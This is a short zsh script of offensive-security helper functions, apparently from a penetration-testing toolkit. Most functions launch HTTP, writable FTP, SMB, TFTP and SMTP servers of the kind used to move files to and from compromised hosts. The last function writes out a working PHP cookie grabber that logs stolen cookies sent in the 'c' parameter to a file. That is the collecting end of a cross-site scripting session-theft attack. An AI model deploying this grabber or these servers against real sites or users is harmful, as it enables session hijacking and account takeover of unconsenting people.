#!/usr/bin/env zsh

############################################################# 
# qq-srv
#############################################################

# Dependencies
__pkgs python-smb python3-pyftpdlib impacket-scripts atftpd

# Functions

qq-srv-web() print -z "sudo python3 -m http.server 80"
qq-srv-ftp() print -z "sudo python3 -m pyftpdlib -p 21 -w"
qq-srv-smb() print -z "sudo impacket-smbserver -smb2supp F ."
qq-srv-tftp() print -z "sudo service atftpd start"
qq-srv-smtp() print -z "sudo python -m smtpd -c DebuggingServer -n 0.0.0.0:25"


qq-srv-gen-grabber() {

cat <<EOF | tee grabber.php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.'\r\n');
fclose($fp);
?>
EOF

}